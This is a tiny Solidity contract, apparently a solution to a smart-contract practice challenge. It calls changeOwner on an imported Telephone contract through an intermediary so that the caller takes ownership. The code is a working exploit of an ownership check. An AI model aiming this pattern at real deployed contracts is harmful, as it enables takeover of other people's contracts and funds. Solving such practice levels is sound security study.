// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./Telephone.sol";

contract TelephoneHack {
    function hack(address telephone) public {
        Telephone(telephone).changeOwner(msg.sender);
    }
}
